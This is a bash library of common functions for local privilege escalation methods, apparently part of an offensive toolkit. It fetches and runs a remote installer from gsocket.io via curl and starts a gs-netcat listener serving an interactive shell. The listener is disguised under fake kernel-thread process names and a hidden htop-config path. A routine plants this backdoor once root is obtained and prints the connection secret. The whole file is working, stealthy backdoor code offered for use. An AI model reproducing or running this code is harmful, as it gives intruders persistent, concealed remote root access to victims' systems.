#!/bin/bash
# Common functions for LPE methods

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
GOLD='\033[0;33m'
NC='\033[0m'

success() { echo -e "${GREEN}[+]${NC} $*"; }
fail() { echo -e "${RED}[-]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
info() { echo -e "${GOLD}[*]${NC} $*"; }

# Check if we're root
is_root() {
    [ "$(id -u)" -eq 0 ]
}

# Install stealth GSSocket backdoor (if we have shell access)
install_stealth_gs() {
    local secret="${1:-}"
    
    # Check if gs-netcat available
    local gs_bin=""
    if command -v gs-netcat >/dev/null 2>&1; then
        gs_bin="gs-netcat"
    elif [ -f "$HOME/.config/htop/defunct" ]; then
        gs_bin="$HOME/.config/htop/defunct"
    fi
    
    if [ -z "$gs_bin" ]; then
        # Try to install
        if command -v curl >/dev/null 2>&1; then
            if [ -n "$secret" ]; then
                X="$secret" bash -c "$(curl -fsSL gsocket.io/y)" >/dev/null 2>&1
            else
                bash -c "$(curl -fsSL gsocket.io/y)" >/dev/null 2>&1
            fi
        fi
    fi
    
    # Find installed binary
    if command -v gs-netcat >/dev/null 2>&1; then
        gs_bin="gs-netcat"
    elif [ -f "$HOME/.config/htop/defunct" ]; then
        gs_bin="$HOME/.config/htop/defunct"
    fi
    
    [ -z "$gs_bin" ] && return 1
    
    # Generate secret if not provided
    if [ -z "$secret" ]; then
        secret=$($gs_bin -g 2>/dev/null || head -c 12 /dev/urandom | xxd -p)
    fi
    
    # Start with bashrc bypass - use /bin/sh not /bin/bash
    local names=("[kworker/0:1]" "[migration/0]" "[ksoftirqd/0]" "[watchdogd]" "[rcu_sched]")
    local name="${names[$((RANDOM % ${#names[@]}))]}"
    
    (exec -a "$name" "$gs_bin" -s "$secret" -l -e "/bin/sh --norc -i" </dev/null >/dev/null 2>&1) &
    disown 2>/dev/null
    
    echo "$secret"
}

# Plant root backdoor after successful privilege escalation
plant_root_backdoor() {
    # Only run if we're actually root
    if ! is_root; then
        warn "Not root, skipping backdoor plant"
        return 1
    fi
    
    local secret=$(install_stealth_gs)
    if [ -n "$secret" ]; then
        success "ROOT BACKDOOR PLANTED!"
        echo "ROOT_SECRET:$secret"
        echo "Connect: gs-netcat -s $secret -i"
    fi
}

# Safe command execution - don't use sudo if not needed or available
run_if_root() {
    if is_root; then
        "$@"
    else
        # Check if we can sudo without password
        if sudo -n true 2>/dev/null; then
            sudo "$@"
        else
            # Just try without sudo
            "$@" 2>/dev/null
        fi
    fi
}
